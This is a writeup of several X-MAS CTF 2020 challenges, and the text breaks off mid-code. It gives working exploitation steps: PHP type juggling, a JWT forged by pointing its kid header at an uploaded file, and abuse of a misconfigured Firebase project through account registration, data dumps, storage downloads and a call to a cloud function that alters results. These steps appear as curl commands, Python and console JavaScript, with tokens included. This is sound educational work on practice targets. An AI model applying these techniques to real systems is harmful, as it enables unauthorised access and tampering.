e<p align="center">
<img src="logo.png"/>
</p>

# X-MAS CTF 2020 Writeup
This repository serves as a writeup for X-MAS CTF 2020

## PHP Master

**Category:** Web
**Points:** 33
**Author:** yakuhito
**Description:**

>Another one of *those* challenges.

>Target: http://challs.xmas.htsp.ro:3000/

<p align="center">
<img src="resources/web-33-php_master/_description.PNG"/>
</p>

### Write-up
In this task, we got a PHP web page with the source code.

<p align="center">
<img src="resources/web-33-php_master/1.PNG"/>
</p>

After looking at the conditions mentioned in the second if() statement, I was thinking about the Php type-juggling.

But the issue was that we can't use the `e` in the input (like `0e5` to represent a zero value).

Since also we couldn't use the `0` as a first character in the first parameter, we can use them in the second parameter but the length of the two parameters should be the same.

This will lead us to find a solution with a zero value. We can for example use `.0` to represent a zero and we can also use `00` or ` 0` (with space) to represent a zero.

This way, the URL will be as following ``http://challs.xmas.htsp.ro:3000/?param1=.0&param2=00``.

<p align="center">
<img src="resources/web-33-php_master/2.PNG"/>
</p>

So, the flag is ``X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}``
___





## X-MAS Chan

**Category:** Web
**Points:** 470
**Author:** yakuhito, Milkdrop
**Description:**

>こんにちは!!! We have made a place on the interwebz to talk about anime and stuffz... We hope you have fun!

>Note: Flag can be found in /flag.php

>Target: http://challs.xmas.htsp.ro:3010/

<p align="center">
<img src="resources/web-470-x_mas_chan/_description.PNG"/>
</p>

### Write-up

After we accessed the task link, we get this page

<p align="center">
<img src="resources/web-470-x_mas_chan/1.PNG"/>
</p>
<p align="center">
<img src="resources/web-470-x_mas_chan/2.PNG"/>
</p>

Then, we access the next link: http://challs.xmas.htsp.ro:3010/b/

And we get the following page

<p align="center">
<img src="resources/web-470-x_mas_chan/3.PNG"/>
</p>

With a banner on the top and a form that looks that we have to use that form in order to solve the task.

But, there was something strange. The posts are shared with all the participants which makes the player a little bit scared from the beginning since he doesn't know that the form only accepts uploaded image files and the input seems to be sanitized because I tested a lot of tests to confirm this.

<p align="center">
<img src="resources/web-470-x_mas_chan/4.PNG"/>
</p>

Other than that, there was a JWT token in the cookies

<p align="center">
<img src="resources/web-470-x_mas_chan/5.PNG"/>
</p>

I decoded it in [https://jwt.io](https://jwt.io) and I got the following parts

<p align="center">
<img src="resources/web-470-x_mas_chan/6.PNG"/>
</p>

The first check that I did was to check what that gif image looks like and it was the image shown earlier in the banner since I can access it with the URL from the top document root [http://challs.xmas.htsp.ro:3010/banner/11.gif](http://challs.xmas.htsp.ro:3010/banner/11.gif).

<p align="center">
<img src="resources/web-470-x_mas_chan/7.PNG"/>
</p>

Another thing that attracted my attention was that banner again. The image changed in a short period of time

<p align="center">
<img src="resources/web-470-x_mas_chan/8.PNG"/>
</p>

So I tried to identify how the cookies are set and I found that they are sent from the server when we access to the page [http://challs.xmas.htsp.ro:3010/getbanner.php](http://challs.xmas.htsp.ro:3010/getbanner.php). And the header of that page is forcing it from the server side to show image/gif content. So there was no embedded images from the source code but the web page is an image. And this makes sense since the image is choosen from the JWT token stored in the banner that gets changed periodically by the server. This is to understand what's going on before moving to the solution.

<p align="center">
<img src="resources/web-470-x_mas_chan/9.PNG"/>
</p>

Now when we look back to the JWT token's header we can see that the algorithm used here is 'HMAC256' and the kid parameter is known to give a hint about the secret that is used by the algorithm when the signature is generated.

<p align="center">
<img src="resources/web-470-x_mas_chan/10.PNG"/>
</p>

This means that if we want to tweak the payload, we should have the secret which seems to be stored in ``/tmp/jwt.key``. The idea of tweaking the payload came in my mind because the flag was stored in /flag.php but it's not shown so we have to get the source code of that web page.

Let's get back to the form. I tried to upload a PNG image as an example to see what I can find there as a result.

<p align="center">
<img src="resources/web-470-x_mas_chan/11.PNG"/>
</p>

This was the result

<p align="center">
<img src="resources/web-470-x_mas_chan/12.PNG"/>
</p>

And the image is locally stored under [http://challs.xmas.htsp.ro:3010/b/src/1608321992782.png](http://challs.xmas.htsp.ro:3010/b/src/1608321992782.png)

<p align="center">
<img src="resources/web-470-x_mas_chan/13.PNG"/>
</p>

So, what if instead of using the /tmp/jwt.key as a secret to create the JWT signature, we use the uploaded image ? Then, we use that image to generate a valid JWT token where the payload will mention the location of the flag which is in /flag.php .

We ran few python3 commands as following:

``python3``

```python3
import jwt
f = open("1608321992782.png", "rb")
key=f.read()
jwt.encode({"banner": "flag.php"}, key, algorithm='HS256', headers={'kid': 'b/src/1608321992782.png'})
```

Output:

```
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImIvc3JjLzE2MDgzMjE5OTI3ODIucG5nIn0.eyJiYW5uZXIiOiJmbGFnLnBocCJ9.K43hF2SgDEu7xZYABatOzV3aj4E2wWcgVNEbAJ3H10o'
```

And that's how we get the new JWT token.

Then, we used it when we requested the /getbanner.php web page as following:

```shell
curl 'http://challs.xmas.htsp.ro:3010/getbanner.php' -H 'Cookie: banner=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImIvc3JjLzE2MDgzMjE5OTI3ODIucG5nIn0.eyJiYW5uZXIiOiJmbGFnLnBocCJ9.K43hF2SgDEu7xZYABatOzV3aj4E2wWcgVNEbAJ3H10o'
```

Output:
```
<?php

$flag = "X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}";

?>
```

So, the flag is: ``X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}``
___





## Santa's Landing Pad

**Category:** Hardware
**Points:** 354
**Author:** trupples
**Description:**

>The elves and I have been working on some christmas lights to aid Santa in landing back home in the fog. (You have NO IDEA how much we pay in repairs every few years) Check them out! https://www.youtube.com/watch?v=162DpMTMfMI

<p align="center">
<img src="resources/hardware-354-santa_s_landing_pad/_description.PNG"/>
</p>

Attached image:

<p align="center">
<img src="resources/hardware-354-santa_s_landing_pad/landingpad.jpg"/>
</p>

### Write-up

When I saw the video few times, I found that there are only 7 LEDs which is the perfect example for the 7 bits used in ASCII (the 8th is set as 0).

But how can we have the confirmation ?

The first thing that I did was to download all the frames/screenshots where the LEDs changed from a state to another. And I got 40 screenshots ([available in this folder](resources/hardware-354-santa_s_landing_pad/)).

The first and the last frame have all the LEDs 'on' so I guess that was the delimiter that indicates when the test started and when it ended. So, I excluded these 2 frames.

We know that the flag format is ``X-MAS{...}``. Since every frame can show a single byte (8 bits), we need 7 frames. And then we can compare the frames side by side to identify the LEDs that changed of state to associate them with the bit position among the last 7 bits (0xxxxxxx).

That was successful as following

<p align="center">
<img src="resources/hardware-354-santa_s_landing_pad/table.PNG"/>
</p>

Then, I continued with extracting the remaining characters from the flag ([available in this folder](resources/hardware-354-santa_s_landing_pad/))

And I found the following string string: ``X-MAS{W3lc0c0Me_To_E.E.E.E.}E.E.}``. But the flag didn't work the first time and that's normal because the flag is a little bit strange.

So, I get back to the video and I found that the hand of the guy was a little bit shaking sometimes probably because the interruptor was sensitive so he want to make sure that all the states were shown. And that's how we know that I was a mistaken and that the flag is shorter than that.

So, the flag is: ``X-MAS{W3lc0Me_To_E.E.}``
___





## The Big Election Hack

**Category:** Web
**Points:** 488
**Author:** yakuhito, Milkdrop
**Description:**

>The news is out: The pink party's candidate has won the election and is going to be the next president of The United Island of Wawanakwa! You are happy for a few minutes, but then remember the last assignment received from your boss before he left for a 3-week holiday: to make sure that the orange party's candidate is elected. Thankfully, your colleague Dimitri sent you a link that looks promising - maybe you won't get sent to Chef Hatchet after all.

>Target: http://challs.xmas.htsp.ro:3009/

<p align="center">
<img src="resources/web-488-the_big_election_hack/_description.PNG"/>
</p>

### Write-up

Our team was close to the flag but we didn't manage to finish the last step. Even though, after the CTF was over I asked for the last step and I was able to confirm it and here is all the details that show you how to solve it.

All the resources related to this task were already downloaded in this folder: [resources/web-488-the_big_election_hack](resources/web-488-the_big_election_hack), so you can test anything later.

After we accessed the task link, we get this page

<p align="center">
<img src="resources/web-488-the_big_election_hack/1.PNG"/>
</p>

When we check the source code of that web page we can see a Firebase configuration that was set there

<p align="center">
<img src="resources/web-488-the_big_election_hack/2.PNG"/>
</p>

There is also a [resources/web-488-the_big_election_hack/js/login.js](js/login.js) file

<p align="center">
<img src="resources/web-488-the_big_election_hack/3.PNG"/>
</p>

After seeing this, I tried to see what's inside /dashboard.html and after some tweaking in that web page to disable the redirection, I was able to get the preview of that web page

<p align="center">
<img src="resources/web-488-the_big_election_hack/4.PNG"/>
</p>

The [resources/web-488-the_big_election_hack/dashboard.html](dashboard.html) file contains also a [resources/web-488-the_big_election_hack/js/dashboard.js](js/dashboard.js) file.

<p align="center">
<img src="resources/web-488-the_big_election_hack/5.PNG"/>
</p>

And we can see that the Firebase API was used to retrieve the data from the firestore in the loadData() and this will show the results in the table displayed in the web page. But since we are not logged in, we can't get any results.

<p align="center">
<img src="resources/web-488-the_big_election_hack/6.PNG"/>
</p>

My teammate [v3rlust](https://github.com/v3rlust) helped me with an idea and provided me with the tool [https://github.com/0xbigshaq/firepwn-tool](https://github.com/0xbigshaq/firepwn-tool) which can be used, in addition, as a GUI for Firebase.

We provided to this tool the required parameters from the Firebase configuration.

<p align="center">
<img src="resources/web-488-the_big_election_hack/7.PNG"/>
</p>

Then, we tried to create an account within the working space defined by the API key.

<p align="center">
<img src="resources/web-488-the_big_election_hack/8.PNG"/>
</p>

And the registration worked.

<p align="center">
<img src="resources/web-488-the_big_election_hack/9.PNG"/>
</p>

This operation is translated with curl commands as:

```
# Register a new account with the email address emperor@yopmail.com
curl 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser?key=AIzaSyDUOa5rtOnbVbF7T7ivUeBBR78L2tkODmY' --data-binary '{"email":"emperor@yopmail.com","password":"123456","returnSecureToken":true}'
```

It's important to get the idToken from the HTTP response because a user is identified with its token.

<p align="center">
<img src="resources/web-488-the_big_election_hack/10.PNG"/>
</p>

This idToken is used to communicate with the Firebase API to do any kind of authorized actions (we will see them later). For example we can retrieve the details of the user:

```
# ID Token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjQyMDEsInVzZXJfaWQiOiJ5OXQ5a3dyR1Z1TWVYSHlrRWd6N25uT0pMZU4yIiwic3ViIjoieTl0OWt3ckdWdU1lWEh5a0Vnejdubk9KTGVOMiIsImlhdCI6MTYwODY2NDIwMSwiZXhwIjoxNjA4NjY3ODAxLCJlbWFpbCI6ImVtcGVyb3JAeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wZXJvckB5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.IwUrkyT4WA7_SYTZHVhM9WDRPrFZCplm0INaJxoksiylBLou0_RJwPYDyQdFW6uHZsdfm-6oCr29vVS7MYbDuFd24BMGWzooHiBZuOQR2PAjQSNOaq7nP0q5pO4Y0vQ17bI5PAqwDxfbRzu6GhRAvgypcIOWmpLpNIxbp7OFQ2pUZzQh29GgBvhDVWHstByps9fvT-v2BM8ClKGApEXxpZdKaceEw00Gqd7VjKY83-M0UU4q-odV28RgRLEWe1POHSXgxYOUnSYjMHGchwAGw0vyhUk-AW4-Ug2WgbIvjL4lMcan6IadajXYcmRftqhK016QjH_fetWm1gW3ANDZKQ
curl 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyDUOa5rtOnbVbF7T7ivUeBBR78L2tkODmY' --data-binary '{"idToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjQyMDEsInVzZXJfaWQiOiJ5OXQ5a3dyR1Z1TWVYSHlrRWd6N25uT0pMZU4yIiwic3ViIjoieTl0OWt3ckdWdU1lWEh5a0Vnejdubk9KTGVOMiIsImlhdCI6MTYwODY2NDIwMSwiZXhwIjoxNjA4NjY3ODAxLCJlbWFpbCI6ImVtcGVyb3JAeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wZXJvckB5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.IwUrkyT4WA7_SYTZHVhM9WDRPrFZCplm0INaJxoksiylBLou0_RJwPYDyQdFW6uHZsdfm-6oCr29vVS7MYbDuFd24BMGWzooHiBZuOQR2PAjQSNOaq7nP0q5pO4Y0vQ17bI5PAqwDxfbRzu6GhRAvgypcIOWmpLpNIxbp7OFQ2pUZzQh29GgBvhDVWHstByps9fvT-v2BM8ClKGApEXxpZdKaceEw00Gqd7VjKY83-M0UU4q-odV28RgRLEWe1POHSXgxYOUnSYjMHGchwAGw0vyhUk-AW4-Ug2WgbIvjL4lMcan6IadajXYcmRftqhK016QjH_fetWm1gW3ANDZKQ"}'
```

Output:

<p align="center">
<img src="resources/web-488-the_big_election_hack/11.PNG"/>
</p>

Now we have an account, we can use it to authentication in the web page of the task that we have seen the first time.

<p align="center">
<img src="resources/web-488-the_big_election_hack/12.PNG"/>
</p>

And here we can see the table filled with the data from the database.

But, before we continue with solving the task, the disabled button "SET/CHANGE RESULTS" was associated with the function "changeResults()".

<p align="center">
<img src="resources/web-488-the_big_election_hack/13.PNG"/>
</p>

And that function was defined as following.

<p align="center">
<img src="resources/web-488-the_big_election_hack/14.PNG"/>
</p>

So, there is nothing left within the source code apart the name of the collection and the document that are used to retrieve the data from the Firestore.

So, let's get back to the Firepwn-tool and use the "Firestore DB Explorer" to dump the data stored in the collection "stats":

<p align="center">
<img src="resources/web-488-the_big_election_hack/15.PNG"/>
</p>

Output:

```
{"note_to_admin":"restrict access to the '/secret' collection","winner_party":"[redacted]","winner":"[redacted]"}
{"winner_party":"The Pink Party","winner":"Chris McLean"}
```

This will lead us to dump the data within the "secret" collection:

<p align="center">
<img src="resources/web-488-the_big_election_hack/16.PNG"/>
</p>

And from here we got a hint to get the flag from the backups.

If we remember what we have, we have explored the Firestore. And the storageBucket can fit well with what we can call "backups".

<p align="center">
<img src="resources/web-488-the_big_election_hack/17.PNG"/>
</p>
<p align="center">
<img src="resources/web-488-the_big_election_hack/18.PNG"/>
</p>

And knowing that every Firebase feature have its proper .js file:

<p align="center">
<img src="resources/web-488-the_big_election_hack/19.PNG"/>
</p>

We have to include a valid .js file that uses the storage API like this one: https://www.gstatic.com/firebasejs/8.1.1/firebase-storage.js

In the following steps, I explained how to work with two different methods: using the Browser's console or using the curl command.

The following instructions needs to be included in the console of the web browser to include the Sotrage script
```
// include the Storage script
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://www.gstatic.com/firebasejs/8.1.1/firebase-storage.js';
document.head.appendChild(script);
```

Once the script is loaded, we need to list all the files stored in the default storage bucket

```
var listRef = firebase.storage().ref()
// Find all the prefixes and items.
listRef.listAll().then(function(res) {
  res.prefixes.forEach(function(folderRef) {
    // All the prefixes under listRef.
    // You may call listAll() recursively on them.
  });
  res.items.forEach(function(itemRef) {
    // All the items under listRef.
  });
}).catch(function(error) {
  // Uh-oh, an error occurred!
});
```

This will send a request described by the following curl command:

```
curl 'https://firebasestorage.googleapis.com/v0/b/official-wawanakwa-elections.appspot.com/o?prefix=&delimiter=%2F' -H 'Authorization: Firebase eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjQzNzgsInVzZXJfaWQiOiJ5OXQ5a3dyR1Z1TWVYSHlrRWd6N25uT0pMZU4yIiwic3ViIjoieTl0OWt3ckdWdU1lWEh5a0Vnejdubk9KTGVOMiIsImlhdCI6MTYwODY2NDM3OCwiZXhwIjoxNjA4NjY3OTc4LCJlbWFpbCI6ImVtcGVyb3JAeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wZXJvckB5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.ej2OLpotzBI_BGddWSzXhCbROuwjlk8_eZ2KjpOtS_gYXDoY9y4xc058t698SA0xv7zt-zLKGA1Z7F1eNL9RHmCXJ4gdF9tJqZobPHi6baTiMbZtCRxZ15YDjipyOrQOJoPci2EGKVA93buR0U6OCSE_kSe0r7-8CQSUuUypyoO6J-eIRn4iRcHcnGG88W-WOIGrwUEBBcfvbcbWsB8iIQGdl_oAoLDYNSxC62kzjejhYmvuSI-GpKjezlAwLtDFyHoNC_wDAlmPElqwOEgtvxuNtIdBZjyilKzRMmKCxdUvTs1HNbpPkOIfwEhPDzo47mubS6ZAEokbr5Vml2NadA'
```

Output:

<p align="center">
<img src="resources/web-488-the_big_election_hack/20.PNG"/>
</p>

Now, we need to download those files using the following Javascript instructions that needs to be ran in the console:

```
firebase.storage().ref('index.js').getDownloadURL().then(function(url) {
  // `url` is the download URL for 'images/stars.jpg'
console.log(url)
  // This can be downloaded directly:
  var xhr = new XMLHttpRequest();
  xhr.responseType = 'blob';
  xhr.onload = function(event) {
    var blob = xhr.response;
console.log(blob);
  };
  xhr.open('GET', url);
  xhr.send();
}).catch(function(error) {
  // Handle any errors
});

firebase.storage().ref('ArrayOfPower:)').getDownloadURL().then(function(url) {
  // `url` is the download URL for 'images/stars.jpg'
console.log(url)
  // This can be downloaded directly:
  var xhr = new XMLHttpRequest();
  xhr.responseType = 'blob';
  xhr.onload = function(event) {
    var blob = xhr.response;
console.log(blob);
  };
  xhr.open('GET', url);
  xhr.send();
}).catch(function(error) {
  // Handle any errors
});

firebase.storage().ref('WhyCanIWriteToThisDir?.bat').getDownloadURL().then(function(url) {
  // `url` is the download URL for 'images/stars.jpg'
console.log(url)
  // This can be downloaded directly:
  var xhr = new XMLHttpRequest();
  xhr.responseType = 'blob';
  xhr.onload = function(event) {
    var blob = xhr.response;
console.log(blob);
  };
  xhr.open('GET', url);
  xhr.send();
}).catch(function(error) {
  // Handle any errors
});
```

This will generate three HTTP requests as follow:

```
curl 'https://firebasestorage.googleapis.com/v0/b/official-wawanakwa-elections.appspot.com/o/index.js?alt=media&token=bf68a747-6948-43ac-b976-9fa1e74b2e3d'
curl 'https://firebasestorage.googleapis.com/v0/b/official-wawanakwa-elections.appspot.com/o/ArrayOfPower%3A)' -H 'Authorization: Firebase eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjQzNzgsInVzZXJfaWQiOiJ5OXQ5a3dyR1Z1TWVYSHlrRWd6N25uT0pMZU4yIiwic3ViIjoieTl0OWt3ckdWdU1lWEh5a0Vnejdubk9KTGVOMiIsImlhdCI6MTYwODY2NDM3OCwiZXhwIjoxNjA4NjY3OTc4LCJlbWFpbCI6ImVtcGVyb3JAeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wZXJvckB5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.ej2OLpotzBI_BGddWSzXhCbROuwjlk8_eZ2KjpOtS_gYXDoY9y4xc058t698SA0xv7zt-zLKGA1Z7F1eNL9RHmCXJ4gdF9tJqZobPHi6baTiMbZtCRxZ15YDjipyOrQOJoPci2EGKVA93buR0U6OCSE_kSe0r7-8CQSUuUypyoO6J-eIRn4iRcHcnGG88W-WOIGrwUEBBcfvbcbWsB8iIQGdl_oAoLDYNSxC62kzjejhYmvuSI-GpKjezlAwLtDFyHoNC_wDAlmPElqwOEgtvxuNtIdBZjyilKzRMmKCxdUvTs1HNbpPkOIfwEhPDzo47mubS6ZAEokbr5Vml2NadA'
curl 'https://firebasestorage.googleapis.com/v0/b/official-wawanakwa-elections.appspot.com/o/WhyCanIWriteToThisDir%3F.bat' -H 'Authorization: Firebase eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjQzNzgsInVzZXJfaWQiOiJ5OXQ5a3dyR1Z1TWVYSHlrRWd6N25uT0pMZU4yIiwic3ViIjoieTl0OWt3ckdWdU1lWEh5a0Vnejdubk9KTGVOMiIsImlhdCI6MTYwODY2NDM3OCwiZXhwIjoxNjA4NjY3OTc4LCJlbWFpbCI6ImVtcGVyb3JAeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wZXJvckB5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.ej2OLpotzBI_BGddWSzXhCbROuwjlk8_eZ2KjpOtS_gYXDoY9y4xc058t698SA0xv7zt-zLKGA1Z7F1eNL9RHmCXJ4gdF9tJqZobPHi6baTiMbZtCRxZ15YDjipyOrQOJoPci2EGKVA93buR0U6OCSE_kSe0r7-8CQSUuUypyoO6J-eIRn4iRcHcnGG88W-WOIGrwUEBBcfvbcbWsB8iIQGdl_oAoLDYNSxC62kzjejhYmvuSI-GpKjezlAwLtDFyHoNC_wDAlmPElqwOEgtvxuNtIdBZjyilKzRMmKCxdUvTs1HNbpPkOIfwEhPDzo47mubS6ZAEokbr5Vml2NadA'
```

In modern web browsers, if the script executed in the current web page is not authorized to request A URL, then the web browser will not allow it. That's why we need to click on the generated link manually to download the files:

<p align="center">
<img src="resources/web-488-the_big_election_hack/21.PNG"/>
</p>

But among the three files, 2 files were downloaded and they are useless to us:

<p align="center">
<img src="resources/web-488-the_big_election_hack/22.PNG"/>
</p>
<p align="center">
<img src="resources/web-488-the_big_election_hack/23.PNG"/>
</p>

And the [resources/web-488-the_big_election_hack/index.js](index.js) is the only interesting file.

<p align="center">
<img src="resources/web-488-the_big_election_hack/24.PNG"/>
</p>

After reading this file, we will learn that this is a Javascript file that can be executed only in the backend using NodeJS. But until now, we only interracted with Firebase API and Google API for the authentication.

As an interesting hint, in the web page there was a Javascript file that is responsible for the Cloud Function feature in Firebase. And after Googling whether the index.js can be ran using Firebase API or not, we can learn that this is possible.

<p align="center">
<img src="resources/web-488-the_big_election_hack/25.PNG"/>
</p>

And to request the web page that is running that index.js file, we need to execute the following instructions in the console of the web browser:

```
var setResults2020 =firebase.functions().httpsCallable('setResults2020');
setResults2020({ winner_party: "The Orange Party" })
  .then((result) => {
    // Read result of the Cloud Function.
    console.log(result.data);
});
```

This generated a HTTP request using curl:

```
curl 'https://us-central1-official-wawanakwa-elections.cloudfunctions.net/setResults2020' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjQzNzgsInVzZXJfaWQiOiJ5OXQ5a3dyR1Z1TWVYSHlrRWd6N25uT0pMZU4yIiwic3ViIjoieTl0OWt3ckdWdU1lWEh5a0Vnejdubk9KTGVOMiIsImlhdCI6MTYwODY2NDM3OCwiZXhwIjoxNjA4NjY3OTc4LCJlbWFpbCI6ImVtcGVyb3JAeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wZXJvckB5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.ej2OLpotzBI_BGddWSzXhCbROuwjlk8_eZ2KjpOtS_gYXDoY9y4xc058t698SA0xv7zt-zLKGA1Z7F1eNL9RHmCXJ4gdF9tJqZobPHi6baTiMbZtCRxZ15YDjipyOrQOJoPci2EGKVA93buR0U6OCSE_kSe0r7-8CQSUuUypyoO6J-eIRn4iRcHcnGG88W-WOIGrwUEBBcfvbcbWsB8iIQGdl_oAoLDYNSxC62kzjejhYmvuSI-GpKjezlAwLtDFyHoNC_wDAlmPElqwOEgtvxuNtIdBZjyilKzRMmKCxdUvTs1HNbpPkOIfwEhPDzo47mubS6ZAEokbr5Vml2NadA' -H 'Content-Type: application/json' --data-binary '{"data":{"winner_party":"The Orange Party"}}'
```

Output:

<p align="center">
<img src="resources/web-488-the_big_election_hack/26.PNG"/>
</p>

And that worked even with a wrong message we know that this is how we have to send the HTTP request.

We get an error because our email address is `emperor@yopmail.com` which does not contain `kuhi.to` pattern and it's not a validated email address.

So let's get back to Firepwn-tool and let's create an email address that fit well with this condition.

<p align="center">
<img src="resources/web-488-the_big_election_hack/27.PNG"/>
</p>

We created an email address `empkuhi.to@yopmail.com`.

Then, we used the API to send an email verification request for the same email address:

```
curl 'https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=AIzaSyDUOa5rtOnbVbF7T7ivUeBBR78L2tkODmY' -H 'Content-Type: application/json' --data-binary '{"requestType":"VERIFY_EMAIL","idToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmM4ZjIyMDJmNjZkMWIxZTEwMTY1OTFhZTIxNTZiZTM5NWM2ZDciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vb2ZmaWNpYWwtd2F3YW5ha3dhLWVsZWN0aW9ucyIsImF1ZCI6Im9mZmljaWFsLXdhd2FuYWt3YS1lbGVjdGlvbnMiLCJhdXRoX3RpbWUiOjE2MDg2NjYyMDIsInVzZXJfaWQiOiJVMlVVaEI0UGRzYnZuNFRhREM1aEt5NzVvUGEyIiwic3ViIjoiVTJVVWhCNFBkc2J2bjRUYURDNWhLeTc1b1BhMiIsImlhdCI6MTYwODY2NjIwMiwiZXhwIjoxNjA4NjY5ODAyLCJlbWFpbCI6ImVtcGt1aGkudG9AeW9wbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZW1wa3VoaS50b0B5b3BtYWlsLmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.SS8CL7uu2Jx2OkLOaSERunfvxyX_PEr_0wzB0N3EhoZs-frrPwxcCv808lcHzYGOHhVJdFM93hfUuWr8Odn_MZIQcWA5KvTT5xr4BHoURbEqd8dHGMhDVozTd_vq_p4Hl93EbfDciFjtse_N3AAT-vJwXgvo4ll88rsVMZ0rMScWBjpMISYc-ann2Qky_QAwgnA1YuBY7aqkW5kStbyHq8-BAW26yrogL6SCr3amUgurr2LYdZvb75oN_7v2G67jmAPMy_bxx6iwdL11I9NxsR11T1fj0N0fSmeFNKPDqjH_4-ADoS811LWxrDvrDgHPvxxIH2XVNI3A_a7LS1bSMA"}'
```

Output:

<p align="center">
<img src="resources/web-488-the_big_election_hack/28.PNG"/>
</p>

Then, we validate the email address by accessing the provided link after checking the mailbox in yopmail.com.

<p align="center">
<img src="resources/web-488-the_big_election_hack/29.PNG"/>
</p>

Now, the email is validated:

<p align="center">
<img src="resources/web-488-the_big_election_hack/30.PNG"/>
</p>

We need to re-authenticate again to have the new IdToken that contains the information about the email that is valid now.

The re-authentication can be done via the console using:

```
firebase.auth().signInWithEmailAndPassword("empkuhi.to@yopmail.com", "123456")
  .then((user) => {
